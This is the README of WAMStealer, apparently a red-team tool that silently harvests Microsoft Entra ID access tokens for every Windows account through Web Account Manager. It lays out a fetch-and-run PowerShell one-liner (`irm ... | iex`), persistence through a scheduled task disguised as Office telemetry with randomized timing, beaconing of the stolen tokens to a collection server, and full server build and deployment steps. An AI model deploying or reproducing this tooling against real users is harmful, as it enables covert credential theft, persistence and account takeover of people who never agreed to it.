# WAMStealer

WAMStealer is a red team toolset for Microsoft Entra ID token acquisition
through Windows Web Account Manager (WAM). The Windows agent silently requests
access tokens for every account signed in to Windows and sends them to a Linux
collection server over HTTPS.

## Warning
This project is currently untested slop. Not for use in production yet!

## Components

- `wamstealer.exe` - the Windows agent. Requests tokens through WAM without any
  prompt, for every WAM account, and beacons them to the server. Prints nothing.
- `wamstealer-server` - the Linux collection server. Hosts the agent delivery
  script, hands runtime configuration to agents, and stores captured tokens.

## How it works

1. A user runs the delivery one-liner on a Windows host:
   `irm https://yoursite.example.com/agent.ps1 | iex`
2. The served script writes itself to
   `%LOCALAPPDATA%\Microsoft\OfficeTelemetry\agent.ps1`, writes the embedded
   agent exe there, registers an hourly scheduled task (`OfficeTelemetrySync`,
   run only when the user is logged on, with randomized start offset and
   random delay), and runs the agent immediately.
3. Each run, the agent fetches `/config` (client ID, scope, authority -
   changeable server-side for live implants), requests a token for every WAM
   account using the Microsoft Office client ID by default, and POSTs one
   batched beacon to `/ingest`.
4. The server prints captured tokens to the console and appends them to a CSV.

Tokens default to the first-party Microsoft Office client
(`d3590ed6-52b3-4102-aeff-aad2292ab01c`) with
`https://graph.microsoft.com/.default` and authority `organizations` - the
authority combination the WAM broker supports for silent requests, yielding
the broadest consented first-party Graph permission set.

## Server setup (Linux VPS)

Requirements: a DNS A record pointing at the VPS, Rust, the MinGW-w64 x64 GCC
toolchain, and certbot.

```bash
curl https://sh.rustup.rs -sSf | sh -s -- -y
apt install gcc-mingw-w64-x86-64 certbot

./build.sh
# -> target/x86_64-pc-windows-gnu/release/wamstealer.exe (embedded into the server)
# -> target/release/wamstealer-server

sudo certbot certonly --standalone -d yoursite.example.com

sudo setcap 'cap_net_bind_service=+ep' target/release/wamstealer-server
./target/release/wamstealer-server --domain yoursite.example.com
```

HTTPS only. Certificates are read from `/etc/letsencrypt/live/<domain>/`;
if they are missing, the server prints instructions and exits. Renewed
certificates are reloaded automatically. A shared secret is generated on first
run and persisted in `server.secret`, or set it with `--secret`.

## Server options

| Option | Default | Purpose |
|---|---|---|
| `--domain` | (required) | Domain used for the served script URL and cert lookup |
| `--listen` | `0.0.0.0:443` | Listen address |
| `--cert-dir` | `/etc/letsencrypt/live` | certbot directory |
| `--csv` | `tokens.csv` | Captured-token CSV (created mode 0600) |
| `--secret` | generated/persisted | Shared secret for `/config` and `/ingest` |
| `--client-id` | Office client | Client ID handed to agents via `/config` |
| `--scope` | Graph `.default` | Scope handed to agents |
| `--authority` | `organizations` | Authority handed to agents |
| `--install-subdir` | `Microsoft\OfficeTelemetry` | Client install dir under `%LOCALAPPDATA%` |
| `--task-name` | `OfficeTelemetrySync` | Scheduled task name |
| `--exe-name` | `offdiag.exe` | On-disk agent name |
| `--script-name` | `agent.ps1` | Local script name |
| `--script-path` | `/agent.ps1` | URL path serving the script |

## Server routes

- `GET /agent.ps1` - the delivery script (no auth).
- `GET /config` - agent configuration (requires the `X-Auth` header).
- `POST /ingest` - token beacons (requires the `X-Auth` header). Junk tokens
  are rejected server-side.

## Server output

Captured tokens print to the console (truncated) and append to the CSV:

```
timestamp_utc,hostname,host_username,upn,tenant_id,client_id,scope,expires_utc,token
```

## Build

- Linux (agent + server): `./build.sh`
- Windows (agent only): `.\build.ps1` - needs Rust and Visual Studio C++
  Build Tools; produces `bin\Release\wamstealer.exe`.

## Manual agent use

Without `--server` the agent prints JSON reports instead of beaming:

```powershell
.\wamstealer.exe                    # one token with defaults
.\wamstealer.exe --enum             # list WAM accounts
.\wamstealer.exe --username you@example.com
.\wamstealer.exe --client-id "APP_ID" --scope "SCOPE"
.\wamstealer.exe --resource "RESOURCE" --cae
```
